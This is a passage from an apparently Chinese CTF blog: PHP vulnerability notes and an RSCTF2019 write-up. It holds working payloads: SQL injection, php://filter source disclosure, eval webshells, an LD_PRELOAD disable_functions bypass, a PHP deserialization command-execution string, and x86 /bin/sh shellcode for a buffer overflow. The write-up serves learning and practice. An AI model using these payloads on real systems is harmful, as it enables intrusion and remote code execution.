class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>])<br><span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Wrong.&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="9"><a href="#9" class="headerlink" title="9."></a><strong>9.</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[user] &amp;&amp; <span class="hljs-variable">$_POST</span>[pass]) &#123;<br><br>  mysql_connect(SAE_MYSQL_HOST_M . <span class="hljs-string">&#x27;:&#x27;</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);<br><br> mysql_select_db(SAE_MYSQL_DB);<br><br> <span class="hljs-variable">$user</span> = trim(<span class="hljs-variable">$_POST</span>[user]);<br><br> <span class="hljs-variable">$pass</span> = md5(trim(<span class="hljs-variable">$_POST</span>[pass]));<br><br> <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select user from ctf where （user=&#x27;&quot;</span>.<span class="hljs-variable">$user</span>.<span class="hljs-string">&quot;&#x27;) and (pw=&#x27;&quot;</span>.<span class="hljs-variable">$pass</span>.<span class="hljs-string">&quot;&#x27;)&quot;</span>;<br><br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="hljs-variable">$sql</span>;<br><br> <span class="hljs-variable">$query</span> = mysql_fetch_array(mysql_query(<span class="hljs-variable">$sql</span>));<br><br> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$query</span>[user]==<span class="hljs-string">&quot;admin&quot;</span>) &#123;<br><br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;</span>;<br><br> &#125;<br><br> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$query</span>[user] != <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br><br>  <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;</span>);<br><br> &#125;<br><br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$query</span>[user];<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看见括号了没，我一直没看见··········</p><p>最简单的注入 和password无关</p><p><code>user=admin ‘)# //注意括号要闭合不然报错 我就是被坑的。</code></p><h2 id="12-PHP对于这个-符号"><a href="#12-PHP对于这个-符号" class="headerlink" title="12.PHP对于这个@符号"></a>12.PHP对于这个<strong>@</strong>符号</h2><h4 id="之前很少在意，只知道它是错误屏蔽的符号"><a href="#之前很少在意，只知道它是错误屏蔽的符号" class="headerlink" title="之前很少在意，只知道它是错误屏蔽的符号"></a>之前很少在意，只知道它是错误屏蔽的符号</h4><h2 id="11-一般形式：strcmp-字符串1，字符串2"><a href="#11-一般形式：strcmp-字符串1，字符串2" class="headerlink" title="11.一般形式：strcmp(字符串1，字符串2)"></a>11.一般形式：<strong>strcmp</strong>(字符串1，字符串2)</h2><p>说明：</p><p>当s1&lt;s2时，返回为负数 注意不是-1  true</p><p>当s1==s2时，返回值= 0                      false</p><p>当s1&gt;s2时，返回正数 注意不是1       true</p><h2 id="11-strlen-判断字符串长度"><a href="#11-strlen-判断字符串长度" class="headerlink" title="11.strlen  判断字符串长度"></a>11<strong>.strlen</strong>  判断字符串长度</h2><p>例，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &gt; <span class="hljs-number">9999999</span>)<br></code></pre></td></tr></table></figure><p>科学记数法，由于要使密码长度小于8或值大于9999999，可以使用1e8或1e9满足条件。</p><h2 id="12-文件包含漏洞"><a href="#12-文件包含漏洞" class="headerlink" title="12.文件包含漏洞"></a>12.<strong>文件包含漏洞</strong></h2><p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。</p><p>同时我也借此机会学到了文件读取的相关知识。</p><p>  <code>include “test.php”php</code>文件包含，在执行流中插入写在其他文件中的有用的代码。读取的时候也是数据流形式，因此可以使用php://filter进行过滤，返回值为0,1。</p><p>  <code>readfile(“test.php”)</code>是将文件以数据流的形式读取过来，并不会执行，但会在前台浏览器上进行解析。返回值是字节数多少。</p><p>  <code>file_get_contents(&quot;test.php&quot;)</code>返回值为文本内容</p><p>  此题运用的就是关于数据流过滤的文件包含，我们一般在进行文件包含的时候都这么写include “test.php”获得的就是test.php直接解析出来。但如果运用readfile(“test.php”) 就不进行解析，导致无法在浏览器前台进行显示。那么问题来了看题</p><p>简单的重复一下他的意思</p><p>注解：</p><p>1.<code>php://filter/</code>可用于处理打开的数据流，起到过滤作用。如果源文件为.php则很有可能在前台显示不出来。</p><p>2.此时我们采用的方法是，先让文件转化为base64格式（<code>convert.base64-encode</code>）然后再输出，这样不论是什么格式的文件都可以在前台输出。</p><p>3.再次解码就可得到源代码，怎么样是不是很神奇啊！</p><p>例<code>http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code></p><h2 id="13-extract-变量覆盖"><a href="#13-extract-变量覆盖" class="headerlink" title="13.extract 变量覆盖"></a>13.extract 变量覆盖</h2><p>总的来说是extract() 函数从数组中将变量导入到当前的符号表，典型的变量覆盖。</p><p>例，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>] == <span class="hljs-string">&quot;POST&quot;</span>) &#123; ?&gt;<br><br> &lt;?php<br><br> extract(<span class="hljs-variable">$_POST</span>);<br><br> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pass</span> == <span class="hljs-variable">$thepassword_123</span>) &#123; ?&gt;<br><br>      &lt;div class=<span class="hljs-string">&quot;alert alert-success&quot;</span>&gt;<br><br>          &lt;code&gt;&lt;?php <span class="hljs-built_in">echo</span> <span class="hljs-variable">$theflag</span>; ?&gt;&lt;/code&gt;<br><br>   &lt;/div&gt;<br><br>  &lt;?php &#125; ?&gt;<br><br> &lt;?php &#125; ?&gt;<br><br> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pass</span> == <span class="hljs-variable">$thepassword_123</span>) &#123; ?&gt;<br></code></pre></td></tr></table></figure><p> 只需要覆盖$pass、$thepassword_123这两个变量使他们相等即可。</p><h2 id="14-php上传截断"><a href="#14-php上传截断" class="headerlink" title="14.php上传截断"></a>14.php<strong>上传截断</strong></h2><h2 id="15-set-time-limit-0"><a href="#15-set-time-limit-0" class="headerlink" title="15.set_time_limit(0);"></a>15.<strong>set_time_limit(0);</strong></h2><p>括号里边的数字是执行时间，如果为零说明永久执行直到程序结束，如果为大于零的数字，则不管程序是否执行完成，到了设定的秒数，程序结束。</p><h2 id="16-PHP变量覆盖"><a href="#16-PHP变量覆盖" class="headerlink" title="16.PHP变量覆盖"></a>16.<strong>PHP变量覆盖</strong></h2><p>extract() 函数从数组中将变量导入到当前的符号表。</p><p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>] == <span class="hljs-string">&quot;POST&quot;</span>) &#123; <span class="hljs-meta">?&gt;</span><br>  extract(<span class="hljs-variable">$_POST</span>);<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pass</span> == <span class="hljs-variable">$thepassword_123</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$theflag</span>;<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>在第三行, 运用了<strong>extract()</strong>函数, 将POST方式获得的变量导入到当前的符号表中. </p><p>然后判断$pass 与$thepassword_123两个变量的内容是否相等.</p><p>但是, 由于extract()函数的不足之处, 导致这段代码存在一个变量覆盖漏洞. </p><p>只要我们这样构造url</p><p>/?pass=&amp;thepassword_123=</p><p>那么, 我们可以发现, $<strong>pass</strong> 变量和$<strong>thepassword_123</strong>变量的内容都会被设置成空字符串.这样就使得两个变量被覆盖。</p><h2 id="17-PHP超全局变量"><a href="#17-PHP超全局变量" class="headerlink" title="17.PHP超全局变量"></a>17.PHP超全局变量</h2><p><strong>$GLOBALS</strong> — 引用全局作用域中可用的全部变量</p><p>$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。</p><p>PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键。</p><p>例，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag1.php&quot;</span>;<br>highlight_file(<span class="hljs-keyword">__file__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$args</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/^\w+$/&quot;</span>,<span class="hljs-variable">$args</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;args error!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;var_dump($<span class="hljs-subst">$args</span>);&quot;</span>);<span class="hljs-comment">//这里涉及超全局变量的使用</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>构造特殊url：<a href="http://120.24.86.145:8004/index1.php?args=GLOBALS">http://120.24.86.145:8004/index1.php?args=GLOBALS</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RSCTF2019_writeup</title>
    <link href="/2019/11/03/RSCTF2019writeup.html"/>
    <url>/2019/11/03/RSCTF2019writeup.html</url>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>这道题。。。只能是我太菜了，居然以为出题人出错题，膜一下夜师傅。</p><p><img src="/images/image-20191103215947920.png" alt="image-20191103215947920"></p><p>第3行是密文串，urldecode之后直接看即可，</p><p>这里解密的时候，我是本地copy下来，然后我用echo 各种变量，得出line5-8分别是</p><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">5.strtr<br>6.substr<br>7.52<br>8.base64_decode<br></code></pre></td></tr></table></figure><p>然后进行变量替换，我比较笨，只会ctrl+h进行替换，耗费了好长时间，最后我都背下来了</p><p>然后解密之后发现，what？？还有一层?好吧，base64解！！！</p><p>然后发现是两段和刚开始相似的代码，</p><p>这里简单试验了一下</p><p><img src="/images/image-20191103220018419.png" alt="image-20191103220018419"></p><p>发现解密之后和第一段差不多（那也很麻烦）</p><p>继续解，最坑的是 第一段解出来是<?php ?>!!!!!!!!!!!!!</p><p>第二段比较重要：内容是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> highlight_file(njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXWT);<br> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[ymlisisisiook]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>哈哈拿到shell了！！</p><p>别急，好戏刚刚开始，你以为system(cat /flag)就行了？不行！</p><p>查看phpinfo发现 disabled_functions特别多！！！！！！！！！</p><p>基本常用的函数全都绕过了。无奈只能绕过，经过查找发现有三种方式可以绕过，</p><p>Com组件，失败，只能windows</p><p>Mod-cgi绕过失败，只能用Ldpreload绕过了</p><hr><p>中间经历一大段尝试，未果</p><p>可以用LD_PRELOAD绕过，这时候发现一篇精品文章：</p><p><a href="https://www.freebuf.com/articles/web/192052.html">https://www.freebuf.com/articles/web/192052.html</a></p><p>嗯，应该可以，无奈发现mail函数也在被禁用的函数列表，</p><p>没事，文章也写了可以用imap_mail()</p><p>没有成功，应该是内部调用了mail函数然后被禁用。</p><p>这时候一血出现了，我仍然没找到方法，只能是暂时搁置（其实是偶尔尝试）</p><p><img src="/images/image-20191103220037744.png" alt="image-20191103220037744">👆血的教训</p><p>晚上入睡前，逛先知社区发现了一个：<a href="https://xz.aliyun.com/t/4688">https://xz.aliyun.com/t/4688</a></p><p>嗯，，，发现error_log也可以调用sendmail</p><p>从而利用ldpreload执行函数，</p><p>这里推荐一个github地址(做本题里面的代码需要修改): <a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a> </p><p>修改成这样：</p><p><img src="/images/image-20191103220055368.png" alt="image-20191103220055368"></p><p>这里的例子传参是三个，我为了测试，把其中两个参数给去掉了，</p><p>其中sopath为so文件目录，采用绝对路径，所以最后我的payload：</p><p>[<a href="http://117.139.247.14:9113/poc.php?cmd=cat%20/flag]">http://117.139.247.14:9113/poc.php?cmd=cat%20/flag]</a>(<a href="http://117.139.247.14:9113/poc.php?cmd=cat">http://117.139.247.14:9113/poc.php?cmd=cat</a> /flag)  成功getflag,哎，与一血失之交臂，只能二血了。</p><h2 id="EzCode"><a href="#EzCode" class="headerlink" title="EzCode"></a>EzCode</h2><p>大佬在睡觉我在做题，运气拿到了一血</p><p>看页面源码，什么都没有，那只能扫一下网站了，扫到了 index.php.bak</p><p>拿到index.php的源码观察，</p><p><strong><img src="/images/clip_image002.jpg" alt="img"></strong></p><p>只是用正则过滤了post，get 没过滤cookie（后期好像没用上）</p><p>所以传入cookie头 ： <strong>Cookie: yemoli=php代码</strong></p><p>此时访问：<code>view-source:http://117.139.247.14:9532/yemoli.php</code></p><p>发现，过滤了引号，因为addslashes  然后还发现只要有<code>@eval($_POST[sb])</code>方式绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html">GET /index.php HTTP/1.1<br>Host: 117.139.247.14:9532<br>Cache-Control: max-age=0<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Cookie:yemoli=eval($_POST[sb])<br>Connection: close<br></code></pre></td></tr></table></figure><p><strong><img src="/images/clip_image004.jpg" alt="img"></strong></p><p>这里注意 本来pHp左右是有双引号的，但是被我删除了，因为有和没有是一样的而且双引号是被过滤的</p><p>然后即可链接了，哈哈哈哈  然后，看见和getshell题相似的目录我心理一哆嗦，完蛋，怕是也禁用了各种函数</p><p>我执行了一下phpinfo函数，幸运的是发现并没有和getshell一题一样，一个disabiledfunctions也没有，太好了 , 果断传文件<img src="/images/clip_image006.jpg" alt="img"></p><p>访问即可获取flag </p><h2 id="Bestlanguage"><a href="#Bestlanguage" class="headerlink" title="Bestlanguage"></a>Bestlanguage</h2><p>访问题目地址:<a href="http://117.139.247.14:9531/">http://117.139.247.14:9531</a> 可见直接给源码，观察,涉及到反序列化利用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">yemoli</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$alive</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;alive = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;alive = <span class="hljs-keyword">new</span> good();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;alive-&gt;action();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">good</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I am a good boy!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">bad</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br>unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;string&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>涉及到3个类，good没什么用，因为反序列化时候不会执行__con struct()方法。</p><p>发现yemoli这个class他的$alive变量是可控的，以为可以直接控制，后来发现这是个protected的变量，所以利用<a href="https://www.freebuf.com/column/182293.html里提到的方法，先创建一个yemoli的子类，">https://www.freebuf.com/column/182293.html里提到的方法，先创建一个yemoli的子类，</a></p><p>代码如下: </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ChildClass</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">yemoli</span></span>&#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$wc</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">make</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;wc = <span class="hljs-keyword">new</span> yemoli();<br><span class="hljs-keyword">$this</span>-&gt;wc-&gt;alive = <span class="hljs-keyword">new</span> bad();<br><span class="hljs-keyword">return</span> serialize(<span class="hljs-keyword">$this</span>-&gt;wc);<br>&#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> ChildClass();<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>-&gt;make();<br></code></pre></td></tr></table></figure><p>即可成功覆盖$alive</p><p>同时修改bad类，为code提供默认值，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">bad</span> </span>&#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span> = <span class="hljs-string">&quot;eval(system(<span class="hljs-subst">$_G1ET</span>[p]));&quot;</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>) </span>&#123;<br>     <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里就成功的生成了序列化字符串</p><p><code>O:6:&quot;yemoli&quot;:1:s:8:&quot;*alive&quot;;O:3:&quot;bad&quot;:1:s:9:&quot;badcode&quot;;s:23:&quot;eval(system($_GET[p]));&quot;;&#125;&#125;</code></p><!--复现时，如果报500错误，可以将$_GET[p]删除，序列化之后再补充，不知道为什么加了$_GET[p]之后就会500，别忘了改一下大小--><p>然后发现代码并没有成功执行，这个卡了很长时间，<br>抱着试一试看的态度去夜师傅的blog看了一下，有一篇文章<a href="https://yml-sec.top/2019/07/14/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98%E6%B3%A8%E6%84%8F%E7%82%B9/">https://yml-sec.top/2019/07/14/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98%E6%B3%A8%E6%84%8F%E7%82%B9/</a><br>里面写道对于private和protected，php在序列化的时候会自动补上不可见的字符，我们这里用%00即可替代，同时这篇文章还提到了一个cve漏洞，可以修改yemoli这个object对象的大小来跳过执行__wakeup()这个魔法函数。</p><p>替代后发现凡是涉及到单引号都会导致题目服务器报500错误，所以迂回，采用get传参<br>最终payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">117.139.247.14:9531</span>/index.php?p=cat%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>Fflag&amp;string=O:<span class="hljs-number">6</span>:%<span class="hljs-number">22</span>yemoli%<span class="hljs-number">22</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>*%<span class="hljs-number">00</span>alive%<span class="hljs-number">22</span>;O:<span class="hljs-number">3</span>:%<span class="hljs-number">22</span>bad%<span class="hljs-number">22</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">9</span>:%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>bad%<span class="hljs-number">00</span>code%<span class="hljs-number">22</span>;s:<span class="hljs-number">23</span>:%<span class="hljs-number">22</span>eval(system($_GET[p]));%<span class="hljs-number">22</span>;&#125;&#125;<br></code></pre></td></tr></table></figure><p>成功getflag</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="pwn-1"><a href="#pwn-1" class="headerlink" title="pwn-1"></a>pwn-1</h2><p>刚开始研究pwn不太会，只能f5了，一看<img src="/../../images/clip_image002-1572790655656.jpg" alt="img"></p><p>发现，采用的是gets函数读取用户输入，这为我们提供了利用点，</p><p>通过图上我们知道，v4距离ebp的长度为0x20</p><p>所以，我们只需要填充0x20+0x08个字节之后的字节就可以覆盖eip了。</p><p>pwn3提供了fun函数，我们得到fun函数地址为：<code>0x04005B6</code></p><p>所以，我们可以写出exp</p><p><img src="/../../images/clip_image003.png" alt="img"></p><h2 id="pwn-2"><a href="#pwn-2" class="headerlink" title="pwn-2"></a>pwn-2</h2><p> 略难，对我这种萌新不太友好，不会233333333</p><h2 id="pwn-3"><a href="#pwn-3" class="headerlink" title="pwn-3"></a>pwn-3</h2><p><em>嘴上说着pwn3，其实文件名是pwn5</em> 先查看文件保护checksec。</p><p><img src="/../../images/clip_image002-1572790864072.jpg" alt="img"></p><p>什么都没开，高兴!这里我们直接拖进ida</p><p><img src="/../../images/clip_image004-1572790864072.jpg" alt="img"></p><p>​                            main函数毫无营养。</p><p>​                            还是看pwn()吧。</p><p><img src="/../../images/clip_image006-1572790864072.jpg" alt="img"></p><p>s是24个字节，但是fgets读取了50个字节，所以会造成溢出。</p><p>我们在ida的函数列表里没有发现与system相关函数。</p><p>程序也没有调用so</p><p>所以只能我们自己构造shellcode了。（nx和canary都没开启保护，所以我们可以执行任意代码，现在我们的任务就是构造shellcode，找一个jmp</p><p>esp） 同时注意jmp后要抬高栈帧。pwntools可以做到。</p><p>我在这里找到了<a href="https://blog.csdn.net/qq_38204481/article/details/86647842我的shellcode，">https://blog.csdn.net/qq_38204481/article/details/86647842我的shellcode，</a></p><p>因此我们的最终payload就是:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode_x86 = <span class="hljs-string">&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span><br>shellcode_x86 += <span class="hljs-string">&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span><br>shellcode_x86 += <span class="hljs-string">&quot;\x0b\xcd\x80&quot;</span><br><br>sub_esp_jmp = asm(<span class="hljs-string">&#x27;sub esp, 0x28;jmp esp&#x27;</span>)<br>jmp_esp = <span class="hljs-number">0x08048554</span><br><br>payload = shellcode_x86 + (<span class="hljs-number">0x20</span>-<span class="hljs-built_in">len</span>(shellcode_x86)) * <span class="hljs-string">&#x27;b&#x27;</span> + <span class="hljs-string">&#x27;bbbb&#x27;</span> +p32(jmp_esp) + sub_esp_jmp<br></code></pre></td></tr></table></figure><p>这里的jmp esp的地址是用ROPgadgets找到的</p><p>Command: <code>ROPgadgets –binary pwn5 –only ”jmp|ret” | grep esp</code></p><p>只有这一个 <code>0x08048554</code></p><p>至此我们可以写出我们的exp了。</p><p><img src="/../../images/clip_image008.jpg" 